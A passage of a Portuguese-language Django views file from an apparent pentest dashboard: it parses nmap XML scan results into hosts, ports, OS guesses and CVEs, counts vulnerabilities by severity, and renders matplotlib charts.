            #"assuntos_ramo_ramo": Postagens.objects.all(),
            "pagina": 1,
            "baixa": baixa,
            "intermediaria" : intermediaria,
            "alta": alta,
            "critica":critica}
    nome["scans"] = verificarScan()


    return render(request, 'documentacao.html', nome)


def assunto(request,id):
    pentest_objeto = Pentest_Rede.objects.get(id=id)

    if pentest_objeto.usuario == request.user:
        rede_objeto = pentest_objeto.rede

        ips = IP.objects.filter(ativo="up", rede=rede_objeto)

        for ip in ips:
            print(ip)
            try :
                Etapas.objects.get(ip=ip)
            except:

                Etapas.objects.create(dominio = ip.ip,
                                          assunto = pentest_objeto,
                                          ip = ip)

        #redetotal
        #baixa, intermediaria, alta, critica,portas_vuln = verificarQuantidadeVulnerabilidade("", request,rede_objeto.id, "")

        labels = []
        baixa_2 = []
        media_2 = []

        alta_2 = []
        critica_2 = []
        portas_vulneraveis = 0
        portas_total = 0
        baixa = 0
        intermediaria = 0
        alta = 0
        critica = 0
        for ip_vai in ips:

                baixa, intermediaria, alta, critica, portas_vuln = verificarQuantidadeVulnerabilidade("", request, "",
                                                                                                  ip_vai)
                print(baixa, intermediaria, alta, critica, portas_vuln)
                print(baixa != 0 and intermediaria!=0 and alta !=0and critica !=0)
                if portas_vuln != []:

                    labels.append(ip_vai.ip)
                    baixa_2.append(baixa)
                    media_2.append(intermediaria)

                    alta_2.append(alta)
                    critica_2.append(critica)
                    portas_vulneraveis = portas_vulneraveis + len(portas_vuln)

                portas_vai = Porta.objects.filter(ip=ip_vai, ativo=1,status="open")
                portas_total = portas_total+len(portas_vai)

        hash_veio = gerarGraficos(labels, baixa_2, media_2, alta_2, critica_2, 'Quantidade de vulnerabilidades',
                                  'Vulnerabilidades', "Baixa", "Média", "Alta", "Crítica")

        labels = ['Vulnerabilidades']
        baixa_2 = [portas_total]
        media_2 = [portas_vulneraveis]

        alta_2 = [0]
        critica_2 = [0]
        hash_veio2 = gerarGraficos(labels, baixa_2, media_2, alta_2, critica_2, 'Quantidade de portas',
                                   'Portas', "Portas no total", "Portas Vulneraveis", "", "")
        nome = {"usuario": request.user,
                "assuntos": Etapas.objects.filter(assunto=pentest_objeto),
                #'pentest': Pentests.objects.filter(assunto=DominioVisualizar.objects.get(dominio=Dominio.objects.get(nome=materia))),
                #"nome": nome,
                "materia": pentest_objeto.id,
                #"assuntos_ramo_ramo": Postagens.objects.all(),
                "pagina": 2,
                "baixa": baixa,
                "intermediaria": intermediaria,
                "alta": alta,
                "critica": critica,
                "hash_veio":hash_veio,
                "hash_veio2": hash_veio2,
                'ips':ips,
                'portas':Porta.objects.filter(ativo=1,status="open"
                                              )

                }
        nome["scans"] = verificarScan()

        return render(request, 'documentacao.html', nome)
    return HttpResponseNotFound()


def assunto_ip(request,id,ip):
    pentest_objeto = Pentest_Rede.objects.get(id=id)

    if pentest_objeto.usuario == request.user:

        rede_objeto = pentest_objeto.rede
        ip_vai = IP.objects.get(ip=ip,rede=rede_objeto)
        portas_vai = Porta.objects.filter(ip=ip_vai,ativo=1).exclude(status='closed').exclude(status='filtered')

        ips = IP.objects.filter(ativo="up", rede=rede_objeto)

        for ip in ips:
            print(ip)
            try :
                Etapas.objects.get(ip=ip)
            except:

                Etapas.objects.create(dominio = ip.ip,
                                          assunto = pentest_objeto,
                                          ip = ip)

        try:
            baixa, intermediaria, alta, critica,portas_vuln = verificarQuantidadeVulnerabilidade("", request, "",
                                                                                         ip_vai)
        except:
            baixa = 0
            intermediaria = 0
            alta = 0
            critica = 0
            for ip in ips:
                baixa = len(Porta.objects.filter(ativo=1, vulneravel=1, tipo=1,ip=ip)) + baixa
                intermediaria = len(Porta.objects.filter(ativo=1, vulneravel=1, tipo=2,ip=ip)) + intermediaria
                alta = len(Porta.objects.filter(ativo=1, vulneravel=1, tipo=3,ip=ip)) + alta
                critica = len(Porta.objects.filter(ativo=1, vulneravel=1, tipo=4,ip=ip)) + critica

        vulnerabilidades = Vulnerabilidades.objects.filter(ip=ip_vai)
        matplotlib.use('Agg')

        labels = ['Vulnerabilidades']
        baixa_2 = [baixa]
        media_2 = [intermediaria]

        alta_2 = [alta]
        critica_2 = [critica]
        hash_veio = gerarGraficos(labels, baixa_2, media_2, alta_2, critica_2, 'Quantidade de vulnerabilidades',
                                  'Vulnerabilidades',"Baixa","Média","Alta","Crítica")

        labels = ['Vulnerabilidades']
        baixa_2 = [len(portas_vai)]
        media_2 = [len(portas_vuln)]

        alta_2 = [0]
        critica_2 = [0]
        hash_veio2 = gerarGraficos(labels, baixa_2, media_2, alta_2, critica_2, 'Quantidade de portas',
                                  'Portas',"Portas no total","Portas Vulneraveis","","")
        try:
            sistema_vai = Sistema_IP.objects.get(ip=ip_vai,posicao=1,
                                       )
        except:
            sistema_vai = ""
        nome = {"usuario": request.user,
                    "materia": pentest_objeto.id,
                    "baixa": baixa,
                    "intermediaria": intermediaria,
                    "alta": alta,
                    "critica": critica,
                    "ip":ip_vai,
                    "portas":portas_vai,
                    "vulnerabilidades":vulnerabilidades,
                    "cve_ip":CVE_IP.objects.filter(ip=ip_vai),
                "hash_veio":hash_veio,
                "hash_veio2": hash_veio2,
                "sistema_operacional":sistema_vai

                }
        nome["scans"] = verificarScan()


        return render(request, 'postagens.html', nome)

def gerarGraficos(labels,baixa_2,media_2,alta_2,critica_2,ylabel,set_title,label_baixa,label_media,label_alta,label_critica):
    import matplotlib.pyplot as plt
    import numpy as np
    matplotlib.use('Agg')

    x = np.arange(len(labels))  # the label locations
    width = 0.15  # the width of the bars

    fig, ax = plt.subplots()
    rects1 = ax.bar(x - width / 1, baixa_2, width, label=label_baixa,color="dimgrey")
    rects2 = ax.bar(x -width*3, media_2, width, label=label_media,color="cornflowerblue")
    rects3 = ax.bar(x + width*3, alta_2, width, label=label_alta,color="gold")
    rects4 = ax.bar(x + width / 1, critica_2, width, label=label_critica,color="orangered")

    # Add some text for labels, title and custom x-axis tick labels, etc.
    ax.set_ylabel(ylabel)
    ax.set_title(set_title)
    ax.set_xticks(x, labels)
    ax.legend()

    ax.bar_label(rects1, padding=3)
    ax.bar_label(rects2, padding=3)
    ax.bar_label(rects3, padding=3)
    ax.bar_label(rects4, padding=3)

    fig.tight_layout()

    hash = hashlib.sha512(str(dataAtual()).encode("utf-8")).hexdigest()
    plt.show()
    plt.savefig("static/graficos/" + hash)
    return hash


def lerArquivoXmlHistorico(dataAgora, usuario, arquivo):
    import xml.etree.ElementTree as ET
    print(usuario)
    if arquivo == "":
        tree = ET.parse("arquivos/nmap/" + str(dataAgora) + str(usuario) + ".xml")
    else:
        tree = ET.parse(arquivo)
    root = tree.getroot()
    """
    scan = Scan.objects.get(dataAgora=dataAgora,
                            usuario=User.objects.get(username=usuario))
    rede_vpn = scan.ip.rede
    """
    ips = []
    sistemas_operacionais_vetor = []
    vulnerabilidades_vetor = []

    class Vulnerabilidades_Definicoes2:
        def __init__(self, title, description):
            self.nome = title
            self.descricao = description


    class Vulnerabilidades2:
        def __init__(self, ip, porta, vuln_tipo, score, grau):
            self.ip = ip
            self.porta = porta
            self.tipo = vuln_tipo
            self.path = ""
            self.parametro = ""
            self.CVSS = score
            self.impacto = ""
            self.recomendacao = ""
            self.tratada = 0
            self.grau = grau

        def getIntegerTratar(self):
                valor = float(str(self.CVSS).split(" ")[0])
                resultado = ""
                if float(valor) >= 7.5:
                    resultado = "crítico"
                if float(valor) < 7.5 and float(valor) >= 5:
                    resultado = "alto"
                if float(valor) < 5 and float(valor) >= 2.5:
                    resultado = "intermediario"

                if float(valor) < 2.5:
                    resultado = "baixo"
                return resultado

        def getIntegerTratarString(self):
            try:
                return  float(str(self.CVSS).split(" ")[0])
            except:
                return self.CVSS

    class Sistema_Operacional_representar:

        def __init__(self, ip, nome, probabilidade, posicao):
            self.ip = ip
            self.nome = nome
            self.posicao = posicao
            self.probabilidade = probabilidade

    class CVE_IPS_2:
        def __init__(self, ip, cve, descricao):
            self.ip = ip
            self.cve = cve
            self.descricao = descricao

    class Porta_representar:
        def __init__(self, porta, servico, produto, versao, status_porta):
            self.porta = porta
            self.servico = servico
            self.produto = produto
            self.versao = versao
            self.status_porta = status_porta

    class IP_representar:
        def __init__(self, ip, portas, status_ip):
            self.ip = ip
            self.portas = portas
            self.status_ip = status_ip

    class IP_hostname:
        def __init__(self, ip, hostname):
            self.ip = ip
            self.hostname = hostname

    cve_ips_vetor = []
    ip_hostname_vetor = []
    for child in root.findall("host"):
        for title in child.findall("address"):
            if title.attrib['addrtype'] == 'ipv4':
                ip = title.attrib['addr']
        for hostname in child.findall("hostnames"):
            print(hostname)
            for a in hostname:
                hostname = str(a.attrib["name"])
                ip_hostname_vetor.append(IP_hostname(ip, hostname))

        for port in child.findall("ports"):
            portas = []
            for state in child.findall("status"):
                status_ip = state.attrib['state']
            for ports in port.findall("port"):
                porta = ports.attrib['portid']

                for state in ports.findall("state"):
                    status_porta = state.attrib['state']

                for serviços in ports.findall("service"):
                    servico = serviços.attrib['name']
                    try:
                        produto = serviços.attrib['product']
                    except:
                        produto = "Não existe"
                    try:
                        versao = serviços.attrib['version']
                    except:
                        versao = 0
                for teste in ports.findall("script"):
                    for osss in teste.findall("table"):
                        validar = 0
                        validar_vuln = 0

                        try:

                            if str(osss.attrib['key'])[:3] == "CVE":
                                cve_texto = str(title.attrib['addr'])
                                descricao = ""
                                validar = 1

                            for element in osss:
                                if element.attrib['key'] == 'state':
                                    estado = element.text
                                    if estado == "VULNERABLE (Exploitable)" or estado == "VULNERABLE":
                                        validar_vuln = 1
                                if element.attrib['key'] == 'scores':

                                    for alou in element.findall("elem"):
                                        score = alou.text

                                if element.attrib['key'] == 'title':
                                    titulo = element.text

                                if element.attrib['key'] == 'description':
                                    print(element.attrib['key'])

                                    for alou in element.findall("elem"):
                                        print(alou.text)
                                        descricao = alou.text
                            if validar == 1:
                                cve_ips_vetor.append(CVE_IPS_2(cve_texto, osss.attrib['key'], descricao))
                                print(titulo)
                                print(descricao)
                                classe_vuln_anotar = Vulnerabilidades_Definicoes2(titulo,descricao)
                            if validar_vuln == 1:
                                vulnerabilidades_vetor.append(Vulnerabilidades2(ip, porta, classe_vuln_anotar, score))

                        except:
                            print("não é vulneravel")

                porta_objeto = Porta_representar(porta, servico, produto, versao, status_porta)
                portas.append(porta_objeto)
            ips.append(IP_representar(ip, portas, status_ip))

        for os in child.findall("os"):
            contador = 0
            for oss in os.findall("osmatch"):
                contador = contador + 1
                sistema_operacional = str(oss.attrib['name'])

                if contador == 1:
                    sistema_operacional_principal = str(oss.attrib['name'])
                    sistema_operacional_principal_probabilidade = str(oss.attrib['accuracy'])

                    print(sistema_operacional_principal)
                    print(sistema_operacional_principal_probabilidade)
                sistemas_operacionais_vetor.append(Sistema_Operacional_representar(str(ip), sistema_operacional,
                                                                                   sistema_operacional_principal_probabilidade,
                                                                                   contador))

        for os in child.findall("hostscript"):
            for oss in os.findall("script"):
                print("id script")
                print(oss.attrib['id'])
                print('\n')
                titulo_vuln = ""
                cve_peguei = ""
                csvv = 0
                for osss in oss.findall("table"):
                    print("cve23")
                    print(str(ip))
                    print(porta)
                    print(osss.attrib['key'])
                    print(osss.text)
                    print("\n\n")
                    for elemm in osss.findall("elem"):
                        print("orx")
                        print(elemm.attrib['key'])
                        if elemm.attrib['key'] == "title":
                            titulo_vuln = elemm.text
                        if elemm.attrib['key'] == "state":
                            stado_vuln = elemm.text

                        print(elemm.text)
                        print("\n\n")
                        for elemm2 in osss.findall("table"):
                            print(elemm2.attrib)
                            print("eita")

                            if elemm2.attrib['key'] == 'ids':
                                cve_peguei = elemm2.find("elem").text
                                print(cve_peguei)
                            if elemm2.attrib['key'] == 'description':
                                print(elemm2.text)
                                print(elemm2.attrib)
                                descricao = elemm2.find("elem").text

                            if elemm2.attrib['key'] == 'scores':
                                csvv = elemm2.find("elem").text

                if ip != "" and titulo_vuln != "":
                    print(titulo_vuln)
                    print(descricao)

                    classe_vuln_anotar = Vulnerabilidades_Definicoes2(cve_peguei,descricao)
                    if cve_peguei != "":
                        cve_ips_vetor.append(CVE_IPS_2(ip, cve_peguei, descricao))
                    vulnerabilidades_vetor.append(Vulnerabilidades2(ip, porta, classe_vuln_anotar, csvv, stado_vuln))

    print("---------ips---------")
    for ip in ips:
        print(ip.ip)
        for porta in ip.portas:
            print(porta.porta)

    for vuln in vulnerabilidades_vetor:
        print("vulnerabilidades")
        print(vuln)
        score = vuln.CVSS

    for cve in cve_ips_vetor:
        print("-----cves----")
        print(cve.cve)
        print(cve.ip)

    for sistemas in sistemas_operacionais_vetor:
        print("sistemas operacionais")
        print(sistemas.ip)
        print(sistemas.nome)
        print(sistemas.probabilidade)
        print(sistemas.posicao)

    for hostname_ler in ip_hostname_vetor:
        print("hostname")
        print(hostname_ler.hostname)
        print(hostname_ler.ip)

    return ips,vulnerabilidades_vetor,cve_ips_vetor,sistemas_operacionais_vetor,ip_hostname_vetor